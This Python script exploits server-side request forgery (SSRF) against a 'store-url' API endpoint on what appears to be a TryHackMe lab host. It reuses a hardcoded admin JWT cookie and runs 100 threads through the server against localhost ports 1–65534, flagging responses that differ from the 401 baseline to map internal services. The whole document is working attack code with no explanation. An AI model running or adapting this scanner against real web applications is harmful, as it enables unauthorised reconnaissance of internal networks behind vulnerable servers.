import requests
import json
from concurrent.futures import ThreadPoolExecutor
import sys

target = "http://storage.cloudsite.thm/api/store-url"
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzcxMzE4MzMyLCJleHAiOjE3NzEzMjE5MzJ9.FwuvuxMLVypzYw1FhQGagtXVydJgfi9YLcXy3ejFwdU"
ports = range(1,65535)
cookies = {"jwt":jwt}
headers = {'Content-type':'application/json'}
completed = 0

def scan(port):
    global completed
    payload = {"url":f"http://localhost:{port}/"}
        
    try:
        response = requests.post(target,headers=headers,cookies=cookies,json=payload)
        completed += 1
        sys.stdout.write(f"\r[*] Progress:{completed}/{len(ports)} (Checking port {port})")
        sys.stdout.flush()
        if response.status_code != 401 and len(response.text) != 41:
            print(f"\nPort {port}: Status {response.status_code} | Size: {len(response.text)}")
    except Exception:
        completed += 1

print(f"Starting scan")
with ThreadPoolExecutor(max_workers=100) as exec:
    exec.map(scan, ports)